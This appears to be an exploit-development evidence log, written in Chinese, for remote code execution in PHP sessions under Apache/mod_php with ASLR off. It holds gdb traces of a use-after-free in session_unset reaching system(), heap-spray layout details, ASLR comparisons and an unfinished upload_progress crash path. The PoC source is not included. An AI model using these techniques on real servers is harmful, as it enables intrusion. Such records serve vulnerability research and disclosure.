# 证据摘录（no-ASLR Apache/mod_php RCE）

## 1. 命令执行证明

远程 `/tmp/x`：

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

连续 5 次（同一无 ASLR 配置，worker 崩溃后 prefork 重建）：

```text
RUN 1 OK: uid=33(www-data) gid=33(www-data) groups=33(www-data)
RUN 2 OK: uid=33(www-data) gid=33(www-data) groups=33(www-data)
RUN 3 OK: uid=33(www-data) gid=33(www-data) groups=33(www-data)
RUN 4 OK: uid=33(www-data) gid=33(www-data) groups=33(www-data)
RUN 5 OK: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

PoC SHA-256：

```text
54b1617309c5da7567fbaa2cbb4b3353a54aa9189871e3e3799c27f5e6dda9f2  tools/d.php
```

## 2. ASLR 对照

```text
ASLR_ON: personality=00000000
ASLR_ON_FAIL_AS_EXPECTED

ASLR_OFF: personality=00040000
ASLR_OFF_OK: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 3. gdb 命中 system

文件：`logs/g16_system_trace.log`

```text
SYSTEM rdi=0x7ffff5e045a0 cmd=id>/tmp/x
#0  __libc_system (line=0x7ffff5e045a0 "id>/tmp/x")
#1  0x00007ffff49cbc9d in zend_hash_destroy (ht=ht@entry=0x7ffff5e04580)
#2  0x00007ffff49cbff8 in zend_array_destroy (ht=0x7ffff5e04580)
#3  0x00007ffff49cc20e in zend_hash_clean (ht=0x7ffff5e031c0)
#4  0x00007ffff47e976f in zif_session_unset (execute_data=<optimized out>,
#5  zif_session_unset (execute_data=<optimized out>,
#6  0x00007ffff49ba644 in ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER ()
#7  execute_ex (ex=0x7ffff5e045a0)
```

## 4. 真实 session 数组布局

文件：`logs/g17_clean_mask.log`

```text
CLEAN ht=0x7ffff5e031c0 size=8 mask=fffffff0 numused=8 arData=0x7ffff5e04540 allocstart=0x7ffff5e04500
```

即：`arData = 分配起点 + 0x40`（hash 区 0x40 字节），旧 arData 位于 320 字节 bin。

## 5. UAF 后旧 arData 的内存（喷块落点）

文件：`logs/g15_uaf_memory.log`（旧 payload 偏移 0x40 落在 OLD 的版本）

```text
SIGSEGV addr=0x100000005 rip=0x7ffff49cc217
OLD memory:
0x7ffff5e04540: 0x0000000700000001 0xfffffff800000010
0x7ffff5e04550: 0x00007ffff5e045a0 0x0000000100000001
0x7ffff5e04560: 0x2f706d742f3e6469 0x0000000000000078
0x7ffff5e04570: 0x00007ffff7d13490 0x0000000000000000
...
```

该次崩溃发生在 clean 读取 bucket0 key（被喷块覆盖成 `0x100000001`）时；调整布局后（保持 bucket0 key=0）才进入 fake zval/fake HashTable 并命中 system。

## 6. upload_progress A/B 线（崩溃现状）

请求 A：multipart + `PHP_SESSION_UPLOAD_PROGRESS` + 文件 + 12MB 字段：

```text
HTTP/1.1 200 OK
Allowed memory size of 8388608 bytes exhausted (tried to allocate 2098791 bytes)
```

请求 A 后 gdb（无 shutdown）：

```text
ps_globals.http_session_vars:
  type=0x10a (IS_REFERENCE), ptr=0x7ffff5e02320
  0x7ffff5e02320: refcount=2, val=0x7ffff5e03230 (IS_ARRAY)
ps_globals.id = 0x7ffff5e600c0
```

请求 B（只有 PHPSESSID + 进度字段，无文件）：

```text
TRACK psvars=0x7ffff5e02320 ti=10a
PS_DTOR type=10a ptr=0x7ffff5e02320
PS_DTOR type=10a ptr=0x7ffff5e01240
TRACK psvars=0x7ffff5e01240 ti=0
REF_DESTROY 0x7ffff5e01240 rc=0 val=0x7ffff5e02150 ti=307
ARR_DESTROY arr=0x7ffff5e02150 flags=8 numused=0
SIGSEGV in _IO_new_fclose(fp=0xffffffff)
```

该线目前是确定的跨请求状态残留 + 可重复崩溃，尚需把 320 字节可控重占/fake HashTable 接上。
